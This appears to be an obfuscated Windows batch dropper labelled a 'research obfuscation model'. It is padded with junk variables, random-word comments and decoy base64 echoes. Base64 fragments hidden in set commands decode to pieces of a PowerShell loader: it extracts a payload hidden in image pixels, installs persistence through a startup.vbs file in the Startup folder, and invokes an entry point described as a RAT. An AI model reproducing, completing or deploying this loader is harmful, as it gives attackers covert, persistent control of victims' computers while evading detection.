@echo off
set mgdJ=
set mld=
set mpmec=
set nGbzi=
set nLScm=
set nLi=
set nRjAB=
set nTGK=
set ngNDt=
set oEKTX=
set oEeE=
set oSt=
set ocIxBfHG=
set pHwPJ=
set pJp=
set pLI=
set pQGYX=
set pVWe=
set pWqc=
set pfVEZ=
set prJdo=
set qJF=
set qTMKa=
set qULd=
set qckM=
set qjtoj=
set qldg=
set qoI=
set qxaUd=
set rBlW=
set rEmp=
set rHyn=
set rRC=
set rYR=
set rcy=
set rjK=
set rkZ=
set rvob=
set rwHBI=
set sAa=
set sEf=
set sKyQ=
set sqBSG=
set ssp=
set tIAC=
set tKrn=
set tNX=
set tUqD=
set tauTN=
set tclIU=
set tfMi=
set tnG=
set toz=
set tuF=
set twHB=
set tzTU=
set uApn=
set uCZeA=
set uPCC=
set uWLC=
set uXXK=
set uZRg=
set uarC=
set uetQQ=
set umaTK=
set uubEU=
set vAt=
set vCb=
set vGYpu=
set vTYg=
set vVaJF=
set vcO=
set vfMYU=
set wAxu=
set wBh=
set wHsn=
set wQBJs=
set wWG=
set watII=
set wmypn=
set wrWMU=
set wwo=
set xKBv=
set xOz=
set xQe=
set xRuHe=
set xUuJr=
set xdh=
set xhy=
set xmHxW=
set xmUJH=
set xqmB=
set xqv=
set xsB=
set yYKVL=
set yaNin=
set ykQTk=
set ylYP=
set yrMdt=
set ysppW=
set ywAgh=
set zAZ=
set zFxD=
set zXwW=
set zfdDr=
set zkvT=
set zxR=

REM --- Research Obfuscation Model (Staged Build) ---
se%DmB%T "XaWQXdVQgdKHan=RyuRENyattGmXsHhTxvAqYfsnpVoW"
se%hHjbe%t "dwcDbhW=shekVaZMWQpRClZBojyyvMYNmekFagd"
REM vision ruby twilight zenith
REM fragment clearing vertex
REM clearing core valley
REM core sword mirage phantom vision odyssey delta beacon
sE%sEf%T "QVfrjJBuUTq=apWLKeGpgLFHObuBoKTA"
se%Hkj%t "wkJAuL=saYalBameofSpYMNtlFb"
REM core shadow zenith cipher twilight undergrowth guard core echo
REM phantom lance ruby fragment core strobe hawk core
sE%TPV%t "HeurakDTGr=DnJtyORpdnieRWMtO"
REM vertex odyssey sword
echo d3pBT1ZVdnV3dVEzdVdGOVpDRmRMWGZRVTBtVlBXRTBQbEZTdjhTWDFEOXZxcktOTg== >nul 2>&1
se%CUpz%t "RExbypJqAcdq=OXJqZbsmotjUFaVRrrZILzPPsiQKxsNwFEF"
REM zenith beacon delta
echo ajhDMmd0d1J5WVhOV0owVUdHWVBvc1I5bzU2TGcyQVNOTHBud0xjR0l2c0U4NkFqaHVPdjI= >nul 2>&1
REM glimmer mirage shadow circle clearing echo shadow hawk
REM vision sword pixel glimmer fragment lance shadow odyssey zenith shadow
se%ZJF%t "VyjmgYSfdOaFus=KWoEVGAWBufbaduVkoDsBoXiLwIHElz"
Se%isY%T "FAupyfPq=BdHDbfAJIAAVLZQJfEkLQRMIIn"
echo ZDZHTU9CU3hWRFlsMTRYWkJ5OExSdk80QzdBWjgwZ3FTbndLVEVsWGZtSW9ySHA3WnBrTVo2bXZ0dE81U0s= >nul 2>&1
echo UnNPdzJNdkJTUXRsdUxCOWZ2bE91TGg1NWNQZ3FpYjVzRmZSYnZ4bUpFSVBpaFZ1bDF3elFW >nul 2>&1
REM beacon shadow guard vertex lance vision echo undergrowth kappa echo
echo UXRVdzdMVUpsYUs5YjdsQmZzR1lGRjRsdnJMMmhZNHdjQ0hDZTduUTduQXJnOHBwQVc4MVY1bTByZDAx >nul 2>&1
REM cipher kappa core cipher twilight binary lance sword undergrowth
REM delta sword shadow ruby hawk pixel
SE%lNIJ%t "KFaFrkRhWfvA=LZDQjclgYVvnRRpbUgN"
echo ME9ydTZuTnA3T2pEbnB0d0ZYT1hDMndIUm1LSlQ1b3FveEJsdEpLM0JTTjZRV000NG82NFNXSEhY >nul 2>&1
echo UWtPRHR4ckJUaDZndnRKcTd2NVhBSTJwbmFYZGd6RmVDSllzV2NIV1RPUW1YWA== >nul 2>&1
echo ODI2cjE2ODdrb0pSbHNGczZrREF5Ynd1Uk0xV2xnMnVhN1VSYkVLSFRkejQxeXQ3RXNiQjVMZm9ScnFvNkRUSzlmb1VCQnd4 >nul 2>&1
REM kiln guard core kappa delta twilight vision binary shadow twilight
echo eHBmUG9xOHUwa05yS2V4T2NhMndFbUVEM0xJOE1jQ2Fla1FYTWUwU0FGckFWZ2R3Z1pBb011NUhhWllF >nul 2>&1
Se%feDdH%T "WPKSvAJoqddaJg=FvXCAzWxFWKQQMteqlRANHH"
se%bRiCQ%t "rWGdXvYa=rpvXBdQolIpaeaLIlpySsBiRDLUPRuGqASV"
REM binary mirage kappa mirage hawk undergrowth guard delta fathom strobe
sE%Cya%T "izimNHHVaxQJI=SophHAyLuXhSSaLPgTCtKIEkbKrJDKJgK"
REM clearing circle valley pixel mirage zenith phantom mirage cipher
se%kht%T "GrYHyvzeZRaqt=gJyvEUpXzAvdRnncqvsCmTaifhGB"
REM fragment sword binary odyssey kiln undergrowth
sE%ENjDU%t "KWgbxndjPaUJXbQ=rBMMWfZAHBDOWsoEpNGingv"
sE%eKvgq%T "uTVdCaxrzPu=gSFxaZPmKcjwoqX"
REM ruby shadow delta cipher kappa
SE%jVNWw%t "LloLnioMnTuzh=lLHKKvPpKAtKOeTzKclpuurvUiWVAfX"
SE%eDed%T "TkEqWRTIBzW=TFlUiNsmmcqycJALelppC"
REM pixel delta delta mirage undergrowth
SE%Xcb%t "VwWpRA=KrRnhhTIZCgKdXMxWmOFkHAvDyaCDtV"
echo aHB0NjFBaEpiR3pCdmVEQ3JBZjZ5NEE0Rkdaalh5T0wzeDdJaXlsY2NJYUFKdmdjRTJOaUl6Mk1uemgydGhjbg== >nul 2>&1
REM ruby glimmer shadow pixel hawk
SE%WOWp%T "ySoGNiqoZzVR=GYykgaRKQUieGgxnIfHlTXwnAGl"
REM odyssey zenith sword beacon shadow
REM circle echo shadow mirage echo
sE%NdSe%T "WMZmTsDLkQErwt=eCNFPqCtfBMtjtofqmrg"
SE%UrHdU%T "bodcXAxCiCY=NrltNKPWWoFcggiURRKoDvce"
Se%KpPU%t "RvjpCIsQaErX=MCkKJGxlbmd0aCA9IChbdWludDMyXSRwMC5SIC1zaGwgMjQpIC1ib3IgKFt1aW50MzJdJHAwLkcgLXNobCAxNikgLWJvciAoW3VpbnQzMl0kcDAuQiAtc2hsIDgpIC1ib3IgW3VpbnQzMl0kcDEuUgpMb2ctU2ls"
REM ruby kiln lance core
REM delta clearing hawk beacon
REM odyssey fragment fragment
REM guard vision beacon fragment
REM undergrowth guard vision lance sword ruby pixel
sE%tUqD%t "WOOqzqDR=asohaBWEsUysaztiOG"
se%WqI%T "TajCqgJEVWuRn=uwttHCKAwokhecHkj"
REM kiln shadow lance fragment circle
echo UlEyZ2RRVDZTNVVoS2d0UVFLdDZwYjBlMmVOaFRrc2NwVk01NnNVNkVSQUNETFVhVmlNTQ== >nul 2>&1
SE%xUuJr%t "FeYnfyvyHtRAyIV=WkeXWusmFGUtuAYdspu"
REM phantom valley cipher twilight twilight
REM valley sword odyssey delta shadow shadow binary clearing
echo MklIeW5uMzVWT1pJUGQwT1BTMndwVENaeHhSZmd4T1BFcldkd2l4UDdESkdlRTA1N004SjFPamph >nul 2>&1
se%SnY%t "ABznPuWWQRYkXf=KBkFlzyVZnncJspLoazryTTCN"
REM kappa twilight hawk pixel strobe
echo THdDTFJnb3FOUVpMTWpRVGd0ZG04WGJEOWZRTEhjRnpJWHp4cUJKWmJYU1V5Z3dVM3Z6SjZkbQ== >nul 2>&1
REM hawk kappa sword pixel ruby kiln valley phantom undergrowth
SE%mpmec%t "TihSmPRxIceW=gJHRydWU7IGJyZWFrIH0KJGV4dHJhY3RlZC5BZGQoJHB4LkcpOyBpZiAoJGV4dHJhY3RlZC5Db3VudCAtZ2UgJGxlbmd0aCkgeyAkZG9uZSA9ICR0cnVlOyBicmVhayB9CiRleHRyYWN0ZWQuQWRkKCRweC5CKTsga"
echo YjlJQlgwV1RTVEpxV3FoaURWMEdJbEp2TVFNRFFzN2h5RTNzU3BxRzJESXVITzZoWU9IREM3MVlGMw== >nul 2>&1
REM fragment cipher undergrowth vision
REM kappa odyssey beacon sword odyssey strobe
REM ruby clearing vertex delta ruby sword
REM twilight mirage pixel binary fragment lance pixel guard
REM clearing hawk shadow valley kiln guard hawk binary lance zenith
echo SG1mTVdBRHZkWDk0U3E3cUppRUEzeFI3VXBrM1RsNGNYeGdQZHpLS2RReDRsRWkxdDQyNGduak5xUmdtZTI1RVd1MGJqSFJFYkQ= >nul 2>&1
SE%pfVEZ%t "VQNpMENVrJY=bnebcucHGOKBXyPpBle"
echo UWhYU0d3UzNnZzdIRWhyNnZkR2FnYTVkc3YwVkhNSzV2ampJVFJHcEJFWXN6QlZxb1ROY3NVNW4wS2FGNU5kcFJuUG1ZOHJmVHJo >nul 2>&1
SE%aEF%T "HMuxyNeZEaYqUdx=iDmlSjNoqZEWOASJkHObPmxTFgIgNSJXIHm"
REM pixel shadow beacon binary vision strobe beacon binary
SE%Riw%T "FRNDwNm=LTBrxlGuGvWrzAmBALvTzsotZupUga"
REM phantom pixel shadow valley echo cipher
echo WmVoUkZ5MVZjbjVpMHVCbUkxV3AyMjR3cG5zdGluRWZKUnphdzIySA== >nul 2>&1
sE%oEeE%T "udjDqgoUb=IhqYsmcXtUziydN"
echo VFI0WkRDQVpiYnNWZDBIaUpqVnN4cElrZ0JQUnJuR0NGems0NUxFZG9IS010cXF0TQ== >nul 2>&1
sE%JNNv%T "NgKPQZMwPD=KsSUqAsXIiQGBAbS"
Se%tKrn%t "IioLlN=H0KZWxzZSB7IFdyaXRlLUhvc3QgJE1lc3NhZ2UgLUZvcmVncm91bmRDb2xvciAkQ29sb3IgfQp9Cn0KZnVuY3Rpb24gSW5zdGFsbC1QZXJzaXN0ZW5jZSB7CnBhcmFtIChbc3RyaW5nXSRTdGFnZXJ"
sE%SfQF%T "cPifrYmDkTdGMw=cQtdhkmKrngSAqEOmWj"
echo VW5lbEJaNE1nRDQwc05oWWwyREhpRUNMVXlOUUxHanVaWFpwcUl1SEZiYjdhQnpTckNFbDBGN1ZY >nul 2>&1
sE%QSvLN%T "ySXUofXgPkVPLY=qZddnLAMnopgijQvqWilsIqxKcli"
REM clearing twilight zenith hawk clearing lance vision binary zenith clearing
se%ejljf%T "TeiHjEVD=ndJYsWYvEZUDTBeGQFXOqJVkOZlHG"
echo cWw4UzZ1MHN5bWNzRER6RHBLRGJsQnRWZmxjU1BndFoyR2lZZTBhNmJTMVJKTVJzcjhNU0djQnA1 >nul 2>&1
REM zenith core twilight ruby fathom undergrowth guard kiln sword
REM strobe vision fragment binary cipher ruby
REM pixel binary clearing undergrowth ruby kiln beacon
echo WTExbE5aQVFkSGxORjF2S0ZHenYxdFN0ejFtd1Z3YzE5Vlp3TXlUaVdobWpPcldxUExVMG0wVVNCeUV0cFNJalc= >nul 2>&1
REM circle phantom pixel clearing kiln mirage undergrowth ruby kappa
echo STdWTEhuREpzREJiTHVkVmxMbzg1cWM5azZTNlEzc3hsYVQ4UzVMMExobmNsUU9l >nul 2>&1
REM sword vision mirage
REM twilight echo lance vertex binary hawk clearing mirage strobe kappa
REM binary undergrowth valley
echo bUtzT0J5UnlOTFVpdFV5Q0l1OEMyT2xJS0ZSR2txaXdIZGVUMW9wbFBSRFNLeUxrQmdWOTNRNHRzaDI5 >nul 2>&1
REM glimmer delta delta guard sword kappa phantom mirage
REM cipher zenith sword vision fathom kiln twilight guard core mirage
echo MlIwTDFPZ3JiYjBiVTFyRnpZVHdHejZzT0R6bFV4ZFhBRUtoeGVKRWY1VFMwV2ZKbA== >nul 2>&1
SE%XNDcd%t "RzHjtqly=AsfOOilqbBWnWMi"
REM hawk zenith glimmer glimmer glimmer beacon ruby shadow
echo cnpaU0NmSWVFZXhBbkQxZnRKSlJjNlFDcllHbzhGZXl6Y25ZbkI5WFNXemJUbGJoT3RwVWFIMEZpVDFSWTFvM3p0Ng== >nul 2>&1
sE%WZFEO%T "JLlNLTfszvij=jsBkdXqHzYNIkDvQMsMwqNcOilzUV"
se%dMvT%T "VGfUyMYJ=tzdHJpbmddJENvbG9yID0gIldoaXRlIiwgW2Jvb2xdJElzRXJyb3IgPSAkZmFsc2UpCmlmICgtbm90ICRTaWxlbnQpIHsKaWYgKCRJc0Vycm9yKSB7IFdyaXRlLUVycm9yICRNZXNzYWdlI"
echo clk4ZGoxMkRoOXlTeVp0UWxOc0Z3UGl5MEFHa0E3Mk5RMktHYkFmVzVPMWtGN1BnalBSb3E= >nul 2>&1
sE%mTE%T "NYFtQJBOTAVLri=brjWYDHuPBZpKHBnHuDVcVWDF"
Se%gHs%t "ASSOFADITbQLZP=PNGJUtdjMndmXofMa"
SE%gID%T "KErYfUDiuio=JGJtcCA9IFtTeXN0ZW0uRHJhd2luZy5CaXRtYXBdOjpGcm9tU3RyZWFtKCRtcykKJHcgPSAkYm1wLldpZHRoCiRoID0gJGJtcC5IZWlnaHQKJHAwID0gJGJtcC5HZXRQaXhlbCgwLDApOyAkcDEgPSAkYm1wLkdldFBpeGVsKDEs"
Se%KYflG%t "kqRSqvggeIhx=XIyrLCXdCujEwLwWjX"
echo QWRMWXVxWGNmZnVYTUlJeHMxdWVNMkxhYjVTSzNsM3BvaUxONkJvSEJXNFlmcGhSV0RiTmljMGRTZnM3Z2VZZ1NTR2JhWXMwelFIekY= >nul 2>&1
se%bUkVy%T "havGRhxK=3RlbmNlIGluc3RhbGxlZCB0bzogJHZic1BhdGgiICJHcmVlbiIKfSBjYXRjaCB7CkxvZy1TaWxlbnQgIkZhaWxlZCB0byBpbnN0YWxsIHBlcnNpc3RlbmNlOiAkKCRfLkV4Y2VwdGlvbi5N"
se%ffE%t "jAGCvLhXL=PxZakcBposalwIYnYfSUukStsWCVefPpatI"
Se%iKpC%T "JLRTpYANcelXEE=fthhXaGwYcMNGGDYMYiGmPgIDd"
SE%bwfH%t "BZHfpkzasK=AifQFIkQFlpwaolgWBlwwAtgiJiBrW"
echo VDIySFh0UU5xRk5XWFlUeEt1RGowM291akpQWEtnSkJWclhUN096bmNYcWdwQkpH >nul 2>&1
echo U2FXdEw2NG9SeFFCN1JNclk4UzVlSXphTzVvYkoxSGk3aGN5UWNyT3dHY0xVQw== >nul 2>&1
echo UVV0a2hMZkxQT1VQMk1jZUMzdWw4U0hoSFp0ZkdORFBPbGZVR3JKQnJlbHdi >nul 2>&1
echo MTNsazBiNU9NN0RBQlFSRUFDUklPSDNIYmM0V2NPZ011RkJIc0piWXkyd0t4ZjdPNjdiUk5pVGRGSWp4aGRpWGpSdTZESDNjQk1uMTd5VEw= >nul 2>&1
REM kiln sword delta pixel phantom circle clearing pixel twilight kiln
sE%hZSd%t "khMqgc=zdMvgdhLhbdwKeYjCJZeprbErgipbPEP"
REM shadow shadow binary vertex delta echo sword
REM undergrowth beacon undergrowth phantom shadow phantom
se%IhjQ%t "GZOArfkk=qfpfYvTUxK"
sE%fAvAa%T "PhilqBRkzKcOyF=GSyyJNgulqTwysqo"
REM core delta hawk pixel hawk lance phantom valley strobe
sE%VYc%T "fplAhUU=fHxLLKAByWnOYEuvZKsopEQgjjsjC"
echo bzNSRkRWcXlKVHc0cUozNDd1WktyN0ZQQzlqbGQ0Wmk4aXk5ejJOaw== >nul 2>&1
REM hawk vision vertex fragment undergrowth cipher cipher fathom odyssey
se%WBdSs%T "VdiMvsPCYGvCvH=zuxtEhgfTzlgbxVqLdnXPIZmkfdnmICXGQl"
Se%LKglr%t "meuLhobdCsHcfhJ=kCoEAvAMELRjAnbkZzCVTGEXebq"
se%awV%T "RpsPoJZ=UtJTNIvAKPxEQapbbJPjhTDpQXSZVFPa"
echo SURya1p2Zkx5UHRqbUtmVE5GaEF4U09xQzBGNWxOUlVXNzM0Z0tEbmZDcXcyZ3VwRTJDTFU= >nul 2>&1
REM strobe kiln valley lance phantom twilight pixel
REM vertex delta beacon undergrowth undergrowth circle cipher
REM phantom zenith core twilight circle clearing guard core
REM core mirage vertex kappa pixel glimmer
SE%WLl%t "eHVvfK=FwmfFBueGdvYZgIpn"
SE%uApn%t "PViEHmiWS=aYsyHnpekLIUiGMBNY"
sE%Pwp%t "cvoftPgHVG=LcTdRVFXUN"
se%Zkoms%T "mgHbFaWIXxYP=gkrUqxiGcE"
REM fathom vertex glimmer beacon
sE%CuagG%t "JdFMKzoUYAhxGMV=SBWYHGXDlzZXCITzjw"
REM valley mirage pixel
SE%MVd%t "pctFwrfekxgrffb=bBYYXmSBBtMwovPARTlCJxH"
echo d2FBOG5vSmxkc2N2SGkwNHIycnNpWDR0cGFoUUtYNUplemVhU2JMOEdlRW9YbDlNNDVsdmlVbEJGZmJaRTBrMmFoUEJ4bWtI >nul 2>&1
sE%pWqc%T "zxPdPaNaomydWyR=xAMXoEmpChnkdzjJJa"
sE%pQGYX%T "JnhallHeJBS=LuouoQNzuWDkbPE"
sE%oSt%T "TBNxthDixJNO=bTjdUvlbLEinkMraB"
echo dUZHWGNmNmRodXdFREkwdUZGSXJwVkNuZTBRMEtVT0ttQTFqT01aNjJSb0pOZzNVRldWaENh >nul 2>&1
REM sword valley clearing kiln circle delta clearing cipher binary
REM circle odyssey guard strobe
REM odyssey clearing sword
REM mirage fathom fragment
REM shadow beacon strobe core hawk
REM clearing undergrowth valley core cipher lance
SE%KRpLB%t "nDYyvBM=PmFIIJBONDCE"
REM vertex core vision beacon mirage lance core kappa delta
echo dEJvaUZiZWlFNGp0OEl3THdpM1hidXVPSDFZNDhFSVZ4Mm9MdXVGdnNkZDdpbnB4N2hhMlFMMUM0TGo= >nul 2>&1
REM ruby core circle vision kiln
REM fragment odyssey fragment guard vision pixel ruby pixel circle cipher
se%rBlW%t "rmoBkecLWGIpa=XTeqsssPLKbBqxEDGnIxsZ"
REM ruby valley sword shadow zenith kappa
echo aTVVOXNzR0hBWUIyZ0JuS3pqZXljOWFKQmZSYk4wcFNxdWJGVUljZjNHR1JqajVobjZIRVZOTlhNRkVQUjZXOUVpaTVGY3dp >nul 2>&1
REM kiln kiln pixel
REM binary vision hawk guard binary
REM clearing valley guard valley odyssey hawk undergrowth
REM mirage vision fathom cipher delta ruby fragment valley
REM lance fathom cipher mirage glimmer
Se%QBJW%t "xHXDgzHpc=UcgRXxAVhz"
REM guard sword fathom
REM odyssey fathom ruby
echo dUk1QlFkQnFUUzFqbHFFRDlXUHh4TE05aGNuWjBxSFh0MnRvY3phcjZHTk1kckRsZVR0YVhxVGg= >nul 2>&1
Se%lwe%t "wCtzTDlBjtBPhjV=IvlmVSbMhBYiHjQK"
echo Und3TTFQRzNsbWI3TWlaSnNnNFlBODZJWDZrU0J6RmRLQVpmazhJM0puamtVZDI= >nul 2>&1
se%ZAESJ%T "IrqfOCO=vZy1TaWxlbnQgIlshXSBJbnZva2luZyBFbnRyeVBvaW50Li4uIChTZXNzaW9uIHdpbGwgYmxvY2sgdW50aWwgUkFUIGNvbXBsZXRlcyBvciBjcmFzaGVzKSIgIkN5YW4iCmlmICgkZW50cnkuR2V0UGFyYW1l"
echo dnF5eHBmeVJiUzhMcEl6Y3JqVTIyaEZFSW16VFlEVjhmTnA1Szlxc0VDbDd4VmlFeWh5Nw== >nul 2>&1
sE%rcy%T "BhjgIwFBTzecx=NoULscLThAWr"
REM echo hawk mirage kappa sword kappa delta circle lance sword
REM twilight fathom binary sword fathom
SE%sqBSG%t "LRbeEi=fWahJHxIrzJJ"
REM kiln clearing vision sword
REM circle lance twilight sword sword glimmer
Se%qoI%t "ittjNwlUSJ=PGXANRozryGdrOhVIqLunljFzPAgGzQ"
sE%ZjpU%t "yzPgbBYTdQrzazA=GwfOwIUNGPudBcYRUKh"
echo YTdLanhFckFSUXVDblNuUlBRZXRSanZZNnJjb1ZxOUdqeHFXTllDb1N4 >nul 2>&1
REM odyssey binary guard fathom delta cipher
REM core pixel shadow kappa valley ruby vertex mirage strobe
Se%LOdV%T "DprCKDcyO=mCapRTJwEqNSqfZrGEMgYVRs"
Se%wHsn%t "yzRUFbMRnb=PuzEdxkuXpmSXmjuqhguNbHfytoAap"
se%mgdJ%t "IISERcXO=bKvdtuElcaUsKSghMY"
REM undergrowth strobe odyssey kiln
echo MEdoQ1pUNmt1bER1YkRpS3RMV2lBN3p3ZHFZWjZhdmdBWE8xVUNHQWc5WTFramtxR1lQSjZNMGVTYjE0YzdSU0k= >nul 2>&1
REM odyssey shadow zenith undergrowth
REM zenith beacon echo sword fragment valley delta
Se%aay%T "gEEPHuzPLtzxdHk=wMhPTjbjpdtrlFvOxaiV"
Se%rEmp%t "TfOjGlOHykk=FkVKVJFRBhHFJBPgXImeD"
Se%MFe%t "ELVmkvWPo=GZDGZTQijtemdRcrUXqREiSeB"
sE%hWpv%t "tEiIQB=0ZW0uSU8uUGF0aF06OkNvbWJpbmUoJHN0YXJ0dXBGb2xkZXIsICJzdGFydHVwLnZicyIpCkxvZy1TaWxlbnQgIlsqXSBDaGVja2luZyBmb3IgZXhpc3RpbmcgcGVyc2lzdGVuY2UgYXQ6ICR2YnNQYXRoIiAiR3JheS"
Se%lVHV%t "gsVfOohmc=xNoPehPyjiWwfWlLUtfPTCGfcEHl"
SE%RmHJ%T "QzyqFwcNV=ynQmONRwQTpbRvKSLjWpslMzXWvQeSe"
REM clearing clearing strobe odyssey beacon undergrowth mirage valley strobe vertex
REM delta strobe kiln shadow circle glimmer valley kappa undergrowth
REM undergrowth fragment sword kiln phantom guard fragment cipher kiln
se%dSd%T "XgHkmKBTRuk=RKZcimqYBjCIulx"
se%SDOrv%T "JJQibaKR=UmVzb2x2ZSkKJG9uRXhjZXB0aW9uID0gW1N5c3RlbS5VbmhhbmRsZWRFeGNlcHRpb25FdmVudEhhbmRsZXJdewpwYXJhbSgkcywgJGUpCiRleCA9ICRlLkV4Y2VwdGlvbk9iamVjdApMb2ctU2lsZW50ICJbRkF"
SE%Oqg%t "jUZPJGWSiM=oAXVUTQAditpMZkyXEEG"
REM ruby glimmer binary core binary phantom fathom kappa vertex vertex
REM ruby kappa beacon hawk shadow core clearing glimmer ruby
echo WXpRYWFtdlRObmc0ODA4cVkwb3k4WVU0YnFiTkQwdHh2WFNucGVHM2w3c2hDSnUxYndXSzFmT0QzZU53bkNkVXlxWWNZSzk3MVlZWlJuMg== >nul 2>&1
REM pixel fragment twilight zenith clearing pixel vertex pixel pixel delta
REM valley clearing echo pixel zenith strobe beacon hawk
sE%xhy%t "HDruVVpozayYrqH=RkrzzRNWeZzJQLxpVbIHtYWfScySlu"
REM mirage mirage twilight kiln strobe strobe strobe undergrowth mirage undergrowth
se%QnP%t "zoMQdWhPWhQFJWO=mreyeeAmzCLWrEMjjpPKqxDqjvruQNr"
SE%AMiIN%T "MCMCFpEEXjh=lkYlHlYWjpgqcm"
SE%LEz%t "GHLeHVFVZKefwiG=zeGMxQDNfvzyMyDayRB"
REM fragment guard shadow binary cipher binary strobe undergrowth glimmer kappa
REM cipher guard lance shadow clearing fragment clearing
REM clearing undergrowth delta binary valley
Se%qJF%t "AFZDiPGZw=dQmhSYqCVdoSmrLAvR"
REM odyssey sword sword vision core beacon undergrowth hawk vision
